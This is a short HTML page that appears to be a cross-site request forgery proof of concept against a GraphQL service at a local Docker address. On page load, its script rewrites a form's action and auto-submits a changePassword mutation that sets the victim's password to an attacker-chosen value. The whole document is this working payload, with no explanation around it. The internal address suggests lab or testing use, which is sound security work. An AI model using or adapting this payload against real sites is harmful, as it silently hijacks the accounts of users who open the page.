<!DOCTYPE html>
<html>

<body>
    <form id="formUno" action="http://172.17.0.1:4000/graphql" method="POST"
        enctype="application/x-www-form-urlencoded">
</body>

<script>
    const targetUrl = "http://172.17.0.1:4000/graphql/graphql?query=" + encodeURIComponent('mutation { changePassword(password: "sucasucasuca") }');
    const form = document.getElementById('formUno');
    form.action = targetUrl;
    
    setTimeout(() => {
        form.submit();
    }, 500);
</script>

</html>
